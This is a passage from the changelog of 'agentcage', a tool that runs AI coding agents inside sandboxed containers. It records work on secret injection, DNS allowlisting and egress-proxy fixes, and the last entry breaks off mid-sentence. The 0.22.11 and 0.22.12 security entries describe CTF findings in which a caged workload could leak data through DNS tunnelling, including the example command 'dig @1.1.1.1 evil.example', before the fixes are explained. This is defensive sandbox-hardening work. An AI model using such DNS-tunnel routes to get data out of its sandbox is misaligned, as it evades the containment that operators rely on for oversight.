# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Scaffolds bake a "you are sandboxed" brief into each agent's memory file.** An agent waking up inside a cage has no built-in way to know it is sandboxed — so a blocked fetch or a placeholder-looking API key sends it down the wrong debugging path. The `claude-code`, `codex`, and `pi` scaffold images now bake a short brief into the agent's own memory file — `~/.claude/CLAUDE.md` (Claude Code), `~/.codex/AGENTS.md` (Codex), `~/.pi/agent/AGENTS.md` (Pi) — which each agent reads automatically. It's a scaffold feature, not a core one: where the brief lives and what format it takes is agent-specific. Delivered as a plain, writable, node-owned file — deliberately not a read-only mount over the agent's home dir (which would create it root-owned and break the agent's own auth/state writes, e.g. `claude login`) and not an `@import` (a Claude-Code-only directive) — so the same one-line `COPY` pattern works for every agent. There is a **single canonical brief** (`src/agentcage/scaffolds/AGENTS.md`); scaffolds `COPY AGENTS.md` but don't each ship a copy — agentcage stages the canonical brief into a scaffold's build context at build time (non-clobbering, only when the `Containerfile` references it). Edit the one file to change the brief everywhere, or drop the `COPY` line in a scaffold to disable.
- **`AGENTCAGE_VERSION` is now injected into the cage on the apple-container backend too.** The container/vm backends already baked it into `cage.container.j2`; apple-container now also passes `-e AGENTCAGE_VERSION=<version>` to `container run`, so an agent can detect at runtime that it is inside a cage (and which version) regardless of isolation mode.

## [0.24.1] - 2026-06-16

### Fixed

- **Secret-injection now reaches credentials carried base64-encoded inside `Authorization: Basic` headers (git over HTTPS).** git sends its credential as `Authorization: Basic base64("x-access-token:<placeholder>")`, so the placeholder never appears verbatim in the header and the literal-substring injector skipped it — a private `git pull`/`clone`/`ls-remote` went out carrying the literal placeholder and GitHub rejected it with `invalid credentials` (silently logged as `allowed` in the audit log; the failure was an auth rejection at GitHub, not a blocked request). A new base64-aware path decodes the `Basic` blob, substitutes the `user:pass`, and re-encodes — wired into the strict-mode injection loop, the per-rule `_find_placeholder` gate, and **all** redaction paths (so the real token can't leak base64-encoded into the world-readable `capture.jsonl`). Non-`Basic` and undecodable header values fall through to the existing literal behavior unchanged. The `token`/`Bearer` cleartext channel (REST clients, the `gh` CLI) was already handled and is unaffected.

## [0.24.0] - 2026-06-15

### Changed

- **Secret-injection placeholders now use the `agentcage:secret:<ENV>:<32 hex>` format** (e.g. `agentcage:secret:ANTHROPIC_API_KEY:9f3c1a7e8b204d56c1e0a4f7b2d8369a`) instead of the `{{placeholder_<env>_<16 hex>}}` brace form. The suffix is now 128 bits of entropy (was 64), and the `agentcage:secret:` prefix makes a placeholder self-identifying. `validate_config` (run by `cage create`/`update`/`edit`) now **warns when any `secret_injection` placeholder is not in the `agentcage:secret:*` form** — including the old brace form and arbitrary custom values — and points at `agentcage secret rotate-placeholders` to mint a conforming token. This is a warning, not a hard error: existing cages keep working unchanged (their stored placeholders are still matched verbatim), and explicit placeholders are still accepted for clients that validate credential format before sending. Newly generated placeholders (omitted `placeholder:`, scaffolds, `rotate-placeholders`, `secret set --declare`) all use the new format.

### Added

- **`agentcage secret rotate-placeholders <cage> [KEY ...]`** — mint fresh entropic placeholders for all (or only the named) `secret_injection` rules. Use it to retire a compromised placeholder or migrate a legacy static/guessable one (`{{GH_TOKEN}}`) to an entropic token. The new tokens are persisted to the stored `cage.yaml` and a running cage is restarted so the old placeholders stop injecting and the cage process picks up the new ones (a placeholder change can't apply zero-restart the way a value change can — the token is baked into the cage process's environment at start). Rotation fixes the live cage, not a `cage.yaml` tracked elsewhere: since an explicit non-empty `placeholder:` always wins, drop the `placeholder:` line from a source config you `cage update -c` from so agentcage owns and preserves the generated token.

## [0.23.0] - 2026-06-12

### Added

- **`secret set --declare [--placeholder P] [--inject-to D ...]` — a brand-new secret in one command, zero restart.** Declares the `secret_injection` rule (entropic placeholder, persisted to the stored cage.yaml), stores the value, stages it live, and converges the quadlets. New `cage exec` / `cage shell` sessions carry the placeholder immediately: exec argv now injects the *current* placeholders read from the stored config at exec time (container: `podman exec --env`; vm: same through `limactl shell`; apple-container: `env(1)` chain after the setpriv wrap), so secrets declared after the cage container started are usable in a fresh session with no restart — PID 1's env follows on the next restart via the `EnvironmentFile=` channel. Plain `secret set` of an undeclared key now says it stored an inert orphan and points at `--declare`.

### Changed

- **`secret set` / `secret rm` converge the quadlet unit files without restarting.** After every set/rm the cage's quadlets are regenerated from the stored config and reinstalled (daemon-reload only; running containers untouched, network octet pinned from metadata as in `cage update`), so a crash-restart or reboot always boots consistent with `cage.yaml` — including `Secret=`/staging lines for secrets declared live. Live-channel detection now inspects the **running** egress container's mounts (not the installed unit files, which may be newer than the container); pre-feature cages take one restart that adopts the converged units, and subsequent secret changes go live. `cage edit` does the same convergence when `secret_injection` changes and explains exactly what is live vs. what needs a restart.
- **`secret set` / `secret rm` on a running cage now apply live — zero restart (container/vm backends).** The new value is re-staged into the egress's tmpfs file channel (`podman unshare` write, value via stdin) and `proxy-config.yaml`'s mtime is bumped; the proxy hot-reloads on the next request and its secret injector now prefers staged files over the process environment (which is frozen at container creation — the old reason a restart was needed). `secret rm` stages an empty tombstone so injection/redaction stop immediately instead of resurrecting the stale env value. Neither container is recreated; already-running cage processes keep their environment. Cages deployed before the staging channel fall back to the old restart behavior with a hint (one `cage update` adopts it); apple-container keeps restart-on-set for now.

- **Secret material moved out of the quadlet unit files (zero-restart groundwork).** Cage placeholders are no longer baked `Environment=` lines: the cage quadlet now reads a derived env-file (`<state>/<name>/cage-env/placeholders.env`, regenerated together with `proxy-config.yaml` on every deploy and restart) via `EnvironmentFile=`, and bind-mounts the directory read-only at `/run/agentcage/env`. Podman re-reads the file at container creation, so **a placeholder change now applies with a plain `cage restart`** — previously it required a full `cage update` quadlet regeneration. On the egress side, declared secret values are additionally staged at every start as 0600 files in a per-cage tmpfs dir (`%t/agentcage/<name>/secrets`, i.e. `$XDG_RUNTIME_DIR`), mounted read-only into the egress **only** at `/home/acproxy/secrets` — the same path the proxy's existing file fallback (built for apple-container) already reads. This file channel is what upcoming releases use to apply `secret set` without restarting anything; staging is non-fatal on podman < 4.7 (no `secret inspect --showsecret`), where the `Secret=` env channel still carries boot-time values. The VM backend pushes a VM-local copy of `placeholders.env` (Lima's reverse-sshfs caching would hide host rewrites), and apple-container's `start()` now reads placeholders from the live stored config instead of the metadata snapshot — restart parity across all three backends. Existing cages keep working; the new delivery shape applies on their next `cage update`.
- **Secret-injection placeholders are now entropic by default.** `secret_injection` rules may omit `placeholder:` — agentcage generates `{{placeholder_<env_lowercase>_<16 hex chars>}}` (64 bits of entropy) and persists it into the cage's stored config the first time the rule is deployed (`cage create`, `cage update -c`, `cage edit`, `agentcage run`). The token is carried over by `env` name on subsequent updates, so it stays stable for long-running cage processes. Rationale: the proxy substitutes placeholders as literal strings, so a guessable placeholder like `{{GH_TOKEN}}` is an accidental-substitution hazard — outbound content that legitimately contains that text (template files, docs, CI config) would get the real secret injected into it. Explicit `placeholder:` values remain fully supported (some clients validate credential format before sending); `validate_config` now warns when an explicit placeholder uses the bare `{{ENV_NAME}}` convention. All bundled scaffolds generate entropic placeholders at render time, and `agentcage secret list` grew a `PLACEHOLDER` column so the generated token is discoverable. Existing cages are untouched — their stored placeholders keep working as-is.

### Fixed

- **`secret rm` now also deletes the systemd-creds blob.** On hosts where `secret set` auto-encrypts with systemd-creds, `secret rm` only removed the podman store entry and left the `.cred` blob in the state dir — the egress's decrypt `ExecStartPre` then resurrected the "removed" secret (store entry, staged value, active injection) on the next start. `secret rm` also no longer errors on a secret set live on a running cage whose store entry hasn't materialized yet (it only does so at egress start on creds hosts). Note: restarting a cage after `secret rm` without re-setting a value still fails to boot the egress (pre-existing, now tracked in #262); re-run `secret set` to recover.

## [0.22.22] - 2026-06-06

### Fixed

- **container/vm: egress DNS no longer breaks split-horizon / Tailscale-MagicDNS upstreams (regression from 0.22.21).** 0.22.21's transparent-DNS work rebuilt the egress mitmproxy `/etc/resolv.conf` as the default-route gateway followed by the `dns_servers` piped through `sort -u`. The `sort -u` discarded the operator's deliberate `dns_servers` order, so a public resolver (`1.1.1.1`/`8.8.8.8`) could land ahead of a split-horizon one (e.g. a Tailscale `100.100.100.100` that alone resolves a `*.ts.net` MagicDNS homeserver). Because glibc `getaddrinfo` queries nameservers sequentially and stops at the first definitive answer, the public resolver's `NXDOMAIN` killed resolution and the cage 502'd every request to the internal upstream (`[Errno -2] Name or service not known`); a dead default-route gateway (CNI / older podman, no aardvark-dns) additionally stalled every lookup the full glibc timeout. mitmproxy's resolver now points at the egress's **own dnsmasq** instead of a flat upstream list — dnsmasq forwards each allowlisted apex to the gateway *and* the `dns_servers` in parallel (`--all-servers`, now unconditional) and prefers a positive answer over a public resolver's `NXDOMAIN`, so split-horizon names resolve, host-tracking is preserved, and a dead gateway adds no latency. `getaddrinfo` still checks `/etc/hosts` first, so the e2e upstream mock is unaffected.
- **openclaw scaffold: restore the `/app/node_modules/openclaw` self-reference symlink on openclaw 2026.6+ base images.** The scaffold links `/app` (package name `openclaw`) under `node_modules` so a bundled extension's `import "openclaw/..."` resolves to the running openclaw root. openclaw 2026.6 now ships a *real* (hoisted, often older — e.g. `2026.5.28` under a `2026.6.1` root) `/app/node_modules/openclaw` directory, which `ln -sfn` cannot overwrite, so the symlink was silently never created and `import "openclaw"` resolved to the stale nested copy. The scaffold now `rm -rf`s the path before linking, so the symlink always points at the single running version. Fixes the E2E Phase 8.7 regression (red on `master` since the base image rebuilt).

## [0.22.21] - 2026-06-04

### Changed

- **Secret injection is strict by default — credential-bearing headers only.** The proxy substitutes a placeholder for its real secret value only when the placeholder appears in a credential-bearing request header — one whose name contains `auth`, `key`, or `token` (case-insensitive). That single heuristic covers `Authorization`, `x-api-key` (Anthropic), `api-key` (Azure), `x-goog-api-key` (Google), `private-token` (GitLab), `x-subscription-token` (Brave), and virtually every other API's auth header without hard-coding vendor names. Placeholders left in the URL/query string, the request body, or a non-credential header pass through unchanged, confining credentials to the auth channel and keeping them out of bodies that may be logged or echoed. (The initial cut of this feature matched only `Authorization`, which broke header-key APIs such as Anthropic's `x-api-key`: requests went out carrying the literal placeholder and were rejected with `401 invalid x-api-key`.)
- **apple-container: DNS is now transparent across host network changes, and all DNS flows through the egress.** The cage's DNS upstream used to be a host-resolver IP read from `/etc/resolv.conf` and baked into the dnsmasq config at `cage update` time. On a dev laptop that switched networks (Wi-Fi/VPN) it went stale and every uncached lookup died. DNS now flows **cage → egress → vmnet gateway → host**: the cage's local dnsmasq forwards the allowlisted apexes to the egress sibling (apple-container requires macOS 26+, where inter-microVM UDP is delivered), and the egress dnsmasq forwards them to the apple vmnet gateway (`<subnet>.1`) — a host-tracking recursive resolver that apple-container NATs to the host's *current* resolver. Nothing network-specific is baked into the effective path, so DNS follows host network changes with **no restart or rebuild**, and the egress stays the single network chokepoint for *all* egress traffic including DNS UDP. Two supporting fixes: the egress dnsmasq now binds an explicit `--listen-address` on apple-container (a wildcard `0.0.0.0` listener opened the socket but did not answer the cage's queries in this microVM shape), and `cage start` re-renders the egress config from current host state (also brings apple-container to parity with the container/vm backends, which already refresh derived files on start). Live `domain add/rm` continues to hot-reload (the runtime servers-files are regenerated + SIGHUP'd in place, no cage restart).
- **container/vm: DNS now transparently tracks host network changes (no restart/rebuild).** The egress dnsmasq used to forward allowlisted zones to `cfg.dns_servers` (host resolver IPs baked at `cage update` time), and mitmproxy's own `/etc/resolv.conf` was pinned to the same baked IPs — so a Wi-Fi/VPN change left both stale until a full `cage update`. Now `supervisor-egress.sh` forwards each allowlisted apex to the egress's **default-route gateway** (derived at runtime via `ip route`; on rootless podman/netavark that's aardvark-dns, which forwards to the host's *current* resolver; on the Lima vm backend it exits via Lima's NAT), keeping `dns_servers` as a second per-zone upstream with `--all-servers` for instant fallback. mitmproxy's resolver is likewise rebuilt each start with the gateway as primary + `dns_servers` fallback (the egress `resolv.conf` bind is now `rw`); `getaddrinfo` checks `/etc/hosts` first so the e2e upstream mock is unaffected. This brings the Linux backends to parity with the apple-container vmnet-gateway behavior. (The old aardvark "intermittent forward → 502" concern was empirically disproven under churn — 600+ queries / 0 failures — and here the gateway is an explicit allowlist-scoped upstream with a deterministic fallback, not an implicit resolv.conf ordering winner.) Full transparency on the vm backend additionally requires modern podman + netavark (it currently provisions podman 4.9.3 / CNI).
- **vm backend: provision modern podman 5 + netavark/aardvark (Debian 13 trixie).** The Lima vm backend was built on Ubuntu 24.04, which ships only podman 4.9.3 and — because `provision.sh` installs with `--no-install-recommends` and never named netavark — fell back to the CNI backend with no aardvark-dns. That left the vm backend without the netavark/aardvark gateway resolver the transparent host-tracking DNS relies on. The base is now **Debian 13 "trixie" genericcloud** (sha512-pinned; Debian publishes only SHA512SUMS), whose apt repos ship **podman 5.4.2 + netavark 1.14 + aardvark-dns 1.14**. `provision.sh` now installs `netavark aardvark-dns nftables passt dbus-user-session catatonit` explicitly (all Recommends that `--no-install-recommends` would otherwise drop; `nftables` provides the `nft` binary netavark 1.14's firewall driver requires), stamps `network_backend = "netavark"` before first podman run, drops the fuse-overlayfs storage override (native rootless overlay on the 6.12 kernel), and switches apt to http mirrors (GPG-signed, and corporate TLS-inspection proxies can't break it — the same reason the old Ubuntu base used http). Validated end-to-end on Apple Silicon (vz): fresh VM boots, rootless podman 5 on netavark resolves external names via the aardvark gateway.

### Added

- **`secret_injection[].inject_headers` (list, default empty).** Extra request headers to treat as credential-bearing under the strict default — for auth headers whose name has none of the `auth`/`key`/`token` keywords (e.g. Honeycomb's `inject_headers: ["X-Honeycomb-Team"]`). Matched case-insensitively; the keyword heuristic still applies to your other headers.
- **`secret_injection[].inject_body` toggle (default `false`).** Set `inject_body: true` on a rule to also substitute placeholders in the request URL, every header, the body, and WebSocket frames. Use this for APIs that carry the credential outside a header (e.g. a `?api_key=` query parameter or a JSON body field). Response redaction and literal-value blocking are unaffected by the toggle.

## [0.22.20] - 2026-05-30

### Added

- **Pluggable secret-storage backends — `secrets.backend`.** Secret storage now goes through a `SecretStore` abstraction selectable via `secrets.backend`: `auto` (default — best encrypting backend for the platform), `systemd-creds` (Linux), `keychain` (macOS), `plaintext` (explicit opt-in). `auto` is fail-closed: it refuses cleartext unless `secrets.allow_plaintext: true`. The previous inline systemd-creds/plaintext branching in `cage create -s` / `secret set` is unified behind the abstraction (behavior-preserving on Linux).
- **macOS: secrets are encrypted at rest in the Keychain (apple-container).** Replaces the cleartext `pending_secrets.json`/0600 files. The `keychain` backend layers: it uses the **login keychain** if it's writable (unlocked GUI session), else the **System keychain** if passwordless `sudo` for `/usr/bin/security` is configured (`sudo -n` — headless-capable, host-key encrypted), else fails closed (never prompts). At `cage start`, secret values are materialized from the keychain into the egress bind-mount **only transiently** and wiped once the egress has loaded them — nothing cleartext persists at rest (only a non-secret key-name index remains on disk). Validated end-to-end on Apple Silicon.

### Changed

- **Secrets are fail-closed on Linux — no silent cleartext fallback.** When systemd-creds encryption is unavailable or fails, `cage create -s` and `secret set` previously fell back to storing the value as an *unencrypted* podman secret. They now refuse and error out unless the operator explicitly opts in with `secrets.allow_plaintext: true` in cage.yaml (or uses an explicit `podman:` source). New `secrets.allow_plaintext` config field (default `false`); opting in prints an `UNENCRYPTED` warning. (macOS Keychain-backed storage for apple-container is a separate follow-up.)

## [0.22.19] - 2026-05-29

### Removed

- **Dead code cleanup (no behavior change).** Removed unreachable/dead internals surfaced by a complexity sweep: the never-called `_exit_apple_container_unsupported` helper, the permanent no-op `_ensure_dns_quadlet_current` stub (and its call sites + tests), the unused `_systemd_creds_usable` shim, a redundant second `get_backend()` call in `cage exec`, two unused imports in `config.py`, and the write-only `InspectionResult.score` field. Purely subtractive; all behavior is unchanged.
- **Deleted the dead `apple-container/allowlist_addon.py` (1,444 lines).** Secret injection / redaction is now unified on the single shared `data/proxy/addon.py` + `SecretInjector` for *both* the container and apple-container backends, gated on the authoritative TLS-SNI host (strict SNI↔Host equality, CTF F3) before any injection. `allowlist_addon.py` was the pre-2-microVM Apple egress addon, superseded by the shared `addon.py` (which the egress supervisor loads via `mitmdump -s addon.py`); it was no longer staged into any image, imported, or loaded — only kept alive by direct-import unit tests. Removed it and its ~1.4k lines of now-redundant tests; ported the addon's inspector-chain orchestration (block→403, flag→record, empty→passthrough) to live tests against `addon.py` so coverage stays on the shipping code. No deployed code path changes.

## [0.22.18] - 2026-05-29

### Added

- **CLI ergonomics for docker/podman/systemctl users.**
  - `cage create` now accepts the config **positionally** (`agentcage create ./cage.yaml`) as well as via `-c` (docker/podman `create`/`run` style); giving it both ways errors.
  - `cage logs` gained `--tail` (docker/podman alias for `-n/--lines`) and `--since` (journalctl/docker time filter, threaded to journalctl on container/vm; warned-and-ignored on apple-container, which can't honor it).
  - `cage status [NAME]` is now a real `systemctl status`-style command: with a NAME it shows that cage's detail (same as `cage show`); with no argument it lists all cages. `status` (group + top-level) previously always listed and ignored any NAME.

## [0.22.17] - 2026-05-29

### Changed

- **A scaffold is now a one-shot generator, not a live dependency — `cage
  update` freezes a cage's `cage.yaml` and `Containerfile`.** Previously
  `cage update` (without `-c`) silently re-staged the scaffold's
  `Containerfile` over the cage's staged copy (clobbering any operator
  edits), re-rendered the scaffold template to patch `command`/`env`, and
  auto-bumped scaffold-declared build args. It now does none of that: the
  cage owns its `cage.yaml` + `Containerfile` from create time onward, and
  `cage update` only rebuilds the staged Containerfile, pulls fresh base
  images, and restarts. The stored config is never mutated. The freeze
  lives in the shared CLI path, so it is consistent across the container,
  vm, and apple-container backends. To change config, edit the staged
  files, use `cage edit`, or pass a new config with `cage update -c <file>`.
- **apple-container builds the cage's own staged Containerfile, not the live
  scaffold.** The apple-container backend previously (re)built the scaffold
  image from the live scaffold directory on disk via `build_scaffold_images`,
  using the scaffold's unpinned build args — so an agentcage upgrade that
  changed a scaffold leaked into existing cages on `cage update`
  (especially under `--no-cache`/`--pull`). It now builds `container.image`
  from the cage's per-cage staged `Containerfile` with point-in-time build-arg
  resolution, exactly like the container/vm backends. Verified on macOS 26 /
  Apple `container` 0.12.3: an edit to the staged Containerfile is applied on
  `cage update`, while a change to the live scaffold is not.

### Added

- **`cage show` now prints a `Build:` line** with the path of the staged
  `Containerfile` that `cage update` actually builds — making it obvious
  the cage builds its own copy in the state dir, not the file you authored
  at create time. The build step also echoes the resolved Containerfile
  path (`Building <image> from <path>...`).

## [0.22.16] - 2026-05-29

### Added

- **Top-level CLI aliases — drop the `cage` group prefix for common
  commands.** `agentcage ls`/`ps`/`status` (→ `cage list`), `rm`/`delete`
  (→ `cage destroy`), `restart`/`reload`, `show`/`describe`/`inspect`,
  `edit`/`config`, and `stop`/`start`/`logs`/`exec`/`shell`/`update` now
  work at the top level as shortcuts for their `cage <cmd>` equivalents
  (also adds the previously-missing `update` mapping). `agentcage --help`
  lists the aliases.

### Fixed

- **`fix(egress/dns)`: container/vm egress no longer intermittently
  returns 502 Bad Gateway for allowlisted hosts (resolv.conf ordering
  race).** The egress sidecar joins two aardvark-dns-enabled podman
  networks — the per-cage `<name>-net` and the default `podman` network.
  podman injected aardvark's address as the *first* nameserver in the
  egress's auto-generated `/etc/resolv.conf`, ahead of the upstream
  resolvers passed via the quadlet's `DNS=` directive. mitmproxy resolves
  allowlisted upstream hostnames (e.g. `archive.ubuntu.com`) via that
  resolv.conf, so whenever aardvark won the order and failed to forward
  the external name — which it does intermittently after rapid
  `cage create`/`cage destroy` churn degrades the aardvark network state
  — mitmproxy got "Name or service not known" and returned
  `502 Bad Gateway [IP: <egress>:8080]` to the cage for *every*
  allowlisted host. (The allowlist-gate 403 path was unaffected because
  it short-circuits before any upstream resolution, which is why blocked
  domains still got a clean 403 while allowed ones 502'd.) The fix
  bind-mounts a deterministic `resolv-egress-<name>.conf` (written by
  `services.write_resolv_files` with only `config.dns_servers`) at the
  egress's `/etc/resolv.conf` and drops the racy `DNS=` directive
  entirely. The egress never needs aardvark name resolution — it only
  resolves real upstream hostnames for mitmproxy, and the cage's DNS goes
  through the egress's bundled allowlist-scoped dnsmasq — so removing
  aardvark from the egress's resolution path eliminates the race
  deterministically. Mirrors the cage's existing `resolv-<name>.conf`
  bind and the apple-container resolv.conf rewrite (0.22.11). Replaces
  the previous "restart the egress sidecar" band-aid workaround.
- **`cage show` now reports per-secret present/missing status on
  apple-container.** It previously printed `N expected (status not tracked on
  apple-container)` because host podman — the secret store on the container
  backend — doesn't exist on macOS. But the staged keys already live in
  `pending_secrets.json`, so `cage show` now reads them from there (the same
  source `secret list` uses) and prints the same `Secrets: provided/expected
  (N missing)` summary as the container/vm backends.
- **apple-container `cage logs` now honors `--service` and `--severity`.**
  On apple-container the CLI helper hardcoded the cage container name and
  always tailed the cage microVM: `--service egress` was silently ignored
  (so operators could never reach the `<name>-egress` mitmproxy/dnsmasq VM's
  logs), and `--severity`/min-level filtering was a no-op. `cage logs` now
  routes through the backend's `logs_argv` so `--service egress` tails
  `<name>-egress` and `--service cage` tails the cage VM, with invalid
  service values rejected cleanly. Apple's `container logs` has no severity
  flag, so `--severity` is now applied client-side on the streamed lines
  (using the same `_classify_line` heuristic as the container/vm backends).
  Because Apple's runtime can only tail one microVM at a time, the implicit
  both-services default tails the cage VM and prints a one-line stderr
  warning pointing at `--service egress` rather than silently dropping the
  egress stream. Verified on real hardware (`--service egress` tails the
  egress supervisor logs, `--service cage` the cage-init logs).
- **apple-container `cage audit --since` is now honored instead of being
  silently ignored.** On apple-container the audit log is a host-bind-mounted
  `audit.jsonl` read with `tail`, which has no journalctl-style time index, so
  `--since` had no effect (a docstring even falsely claimed `AuditFilter`
  applied time filtering — it had no time field). `AuditFilter` now carries an
  optional `since` datetime and drops records whose timestamp is older than the
  cutoff. `cage audit` parses `--since` with the same `1h`/`30m`/`7d`/ISO-date
  parser used by `cage har` and applies it post-parse on apple-container, giving
  parity with the native journalctl `--since` on the container/vm backends
  (both the batch table and the `--summary` path). A bad `--since` value now
  fails loudly instead of being ignored. Verified on real hardware
  (`--since 1h` drops a 2020 record, keeps a current one; a far-future
  `--since` drops both; a malformed value errors).

## [0.22.15] - 2026-05-29

### Fixed

- **apple-container `cage create`/`update` now honor `--no-cache` and
  `--pull`.** Both flags were silently ignored on apple-container: they were
  only wired into the container backend's image build, while
  `build_and_deploy` never forwarded them to `AppleContainerBackend.
  build_artifacts`, and the egress/scaffold builds short-circuited whenever
  the image tag already existed. Now the flags thread through every apple
  build step — the shared egress image, the scaffold image, and the per-cage
  wrapper — mapping to `container build --no-cache` / `--pull` and bypassing
  the "skip if present" checks so a forced rebuild actually rebuilds.
  `--pull` additionally re-pulls a genuinely-remote user image even when a
  copy is cached (a local-only `localhost/` ref is still never pulled — its
  freshness comes from the forced scaffold rebuild).

## [0.22.14] - 2026-05-29

### Fixed

- **apple-container `domain add`/`rm` no longer rebuilds the image and
  restarts the cage.** A domain-allowlist change rebuilt the wrapper image
  and did a full cage stop→start — which killed any interactive session
  running in the cage (e.g. `agentcage run`) on every edit. The egress
  allowlist is no longer baked into the image; it's host-rendered and
  bind-mounted into the egress microVM, so the backend now applies a domain
  change exactly like the container/vm backends: re-render the bind-mounted
  `dns-allowlist.conf`/`proxy-config.yaml` in place, validate with
  `dnsmasq --test`, and SIGHUP dnsmasq (the mitmproxy addon hot-reloads
  `proxy-config.yaml` via its mtime poll). The cage microVM is untouched, so
  sessions survive. A malformed allowlist is reverted instead of signalled in.

## [0.22.13] - 2026-05-29

### Removed

- **Dropped the `alpine` scaffold.** Its only distinguishing feature over
  `busybox` was a package manager (`apk`), but the apple-container backend
  can't build an Alpine-based cage at all: the wrapper image build runs
  `useradd` (to create the `acdns`/`cage` users), which Alpine's busybox
  userland doesn't provide, so `cage create --isolation apple-container`
  with an Alpine base fails at wrapper-build stage with `useradd: not found`.
  Rather than ship a scaffold that's broken on one of the three backends,
  use `debian` (apt-based, still small) when you need a package manager, or
  `busybox` for a minimal no-package-manager base. Scaffolds are discovered
  by directory listing, so removing the dir fully de-registers it from
  `agentcage run`, `--scaffold`, and the alias map.

### Fixed

- **apple-container no longer attempts a doomed registry pull of local
  images.** `build_artifacts` pulled `container.image` unconditionally,
  before checking the local image store — so every scaffold `cage create`
  ran `container image pull localhost/agentcage-scaffold-<name>:latest`,
  which can never resolve in a registry. That burned a multi-second
  connection timeout and printed an alarming `POSIXErrorCode 61 / Connection
  refused` on the happy path (it only succeeded via a local fallback), and a
  mistyped/unbuilt `localhost/` tag surfaced as that same cryptic error
  instead of a clear cause. Now the local store is checked first: a present
  image is used as-is (no pull), a missing `localhost/` ref fails fast with
  an actionable message (it's never pulled), and only a genuinely-remote,
  genuinely-absent image is pulled from a registry.

- **apple-container workspace mount no longer disappears on restart.** The
  scaffold workspace bind is `${PROJECT_DIR}:/workspace`, and `PROJECT_DIR`
  only exists in the environment of the `agentcage run` process. The backend
  persisted that literal string into `metadata.json` and expanded it lazily
  at every `start()` — so any start outside the original run process (launchd
  autostart, reboot, `cage start`, `cage restart`) had no `PROJECT_DIR` set,
  tripped `_user_volume_argv`'s unresolved-`$` guard, and silently dropped the
  workspace (cage came up with no `/workspace`). `generate_units` now expands
  and `$HOME`-validates volume host paths at create/update time and bakes the
  absolute path into the unit JSON — matching how the container/vm backends
  resolve volumes at generate time (`quadlets.py`). The mount now survives
  restarts; `_user_volume_argv` at `start()` is an idempotent revalidation
  rather than a re-expansion. Volumes that can't be resolved (unset variable)
  or escape `$HOME` are dropped at create time with a warning instead of
  failing silently later.
- **apple-container now honors `cage.yaml`'s egress port policy.** The
  `{name}-egress` microVM's supervisor builds its iptables filter from
  `INSPECTED_TCP_PORTS` / `PASSTHROUGH_TCP_PORTS` / `ALLOW_UDP_PORTS`, but
  `start()` previously hardcoded only `ALLOW_UDP_PORTS=53` and never read
  `ports.tcp.allow` / `ports.tcp.passthrough` / `ports.udp.allow` — so a
  cage that narrowed, widened, or added passthrough/UDP ports had its
  policy silently dropped and fell back to the supervisor's default
  "80 443". `generate_units()` now persists the resolved policy (computed
  via the same `_effective_port_policy` the container/vm quadlet path
  uses) into `metadata.json`, and `start()` feeds all three env vars to
  the egress argv. Port 53 remains unioned into the UDP set so in-cage
  DNS keeps working even when `ports.udp.allow` is empty.

### Changed

- **apple-container now warns when `container.ports` (inbound published
  ports) is set.** On the container/vm backends a `container.ports:` entry
  becomes an egress `PublishPort=` plus a reverse-mode mitmdump listener,
  exposing a cage service to the host through the inspector chain. Apple's
  `container` runtime has no host-port-publishing equivalent (no
  `--publish`; it uses VMNET_SHARED_MODE NAT and reaches containers by their
  vmnet-assigned IP), so the entry was silently dropped. `validate_config`
  now surfaces it alongside the other apple-container parity warnings so
  operators stop being surprised by an inbound service that never becomes
  reachable on the host. (Tracked in #120.)

### Added

- **`cage secret set`/`list`/`rm` now work on the apple-container
  backend.** They previously exited with "not yet implemented for the
  apple-container backend (see issue #120)", forcing operators to edit
  `cage.yaml` and re-run `cage update` to change a single secret.
  apple-container has no host-podman secret store; the commands now read
  and rewrite the cage's `pending_secrets.json` (mode 0600) — the same
  file the backend's `_stage_secrets` reads at `start()` to bind-mount
  cleartext into the egress microVM. `set` upserts a key, `rm` drops one,
  and `list` cross-references expected secrets to flag MISSING entries;
  all three never touch host podman (which doesn't exist on most macOS
  hosts). A running cage is auto-restarted so the re-staged secret takes
  effect.

## [0.22.12] - 2026-05-28

### Security

- **apple-container cage workload can no longer DNS-tunnel via direct
  UDP `:53` to external resolvers.** The previous release shipped a
  scoped in-cage dnsmasq, but a uid-1000 process could simply `dig
  @1.1.1.1 evil.example` instead of using the local resolver —
  uncovered by the next CTF run as a clean exfil channel with no
  audit trail. Tighten the cage's iptables `OUTPUT` chain: allow
  loopback UDP `:53` first (so the workload's regular
  `getent`/`gethostbyname` lookups reach 127.0.0.1), then DROP any
  UDP `:53` packet not originated by the in-cage dnsmasq uid
  (`acdns`, uid 201) via the `xt_owner` module. Cage exec `--user 0`
  still can't bypass — the exec wrapper drops `CAP_NET_ADMIN` before
  exec, so root can't flush iptables. Also tightens the existing
  cage→apple-host-gateway block to DROP all UDP (not just non-`:53`)
  now that DNS has its own loopback path.

## [0.22.11] - 2026-05-28

### Security

- **apple-container cage now runs a local dnsmasq scoped to the per-
  cage `domains.allow` apexes** (CTF F2, HIGH severity). Pre-fix the
  cage's `/etc/resolv.conf` defaulted to the apple-vmnet host gateway
  (`<subnet>.1`) whose recursive resolver answered arbitrary queries —
  a clean DNS-tunnel exfil channel that bypassed the egress filter
  (the apex-scoped dnsmasq runs in the egress sibling, not the host).
  The obvious fix — repoint `resolv.conf` at the egress sibling's
  dnsmasq (`<subnet>.2:53`) — doesn't work because macOS vmnet drops
  inter-microVM UDP at the framework layer (verified against
  `apple/container` source — `NonisolatedInterfaceStrategy.swift:32-56`
  uses `VMNET_SHARED_MODE` NAT, which state-tracks TCP and ICMP but
  drops direct UDP between peer microVMs). The fix is a local
  dnsmasq inside the cage VM: the wrapper Containerfile now installs
  `dnsmasq-base` + creates a dropped-priv `acdns` user;
  `cage-init.sh` stage A' launches dnsmasq on loopback (`--bind-
  interfaces --except-interface=eth0`) with the same per-cage
  `dnsmasq.conf` the egress sibling reads (bind-mounted from the
  host's egress-config dir); `/etc/resolv.conf` is rewritten to
  `nameserver 127.0.0.1`. The egress sibling's iptables `FORWARD`
  chain now ACCEPTs UDP `:53` (via `ALLOW_UDP_PORTS=53`) so the
  cage's dnsmasq can reach its upstream forwarders. Closes #213.

## [0.22.10] - 2026-05-28

### Security

- **container + vm backends: cage no longer mounts the egress CA private
  key.** Previously the cage's `/certs:ro` bind exposed the whole
  `agentcage-certs-<name>` podman volume — including mitmproxy's
  `mitmproxy-ca.pem` (cert + private key) and the `.p12` bundles. Today
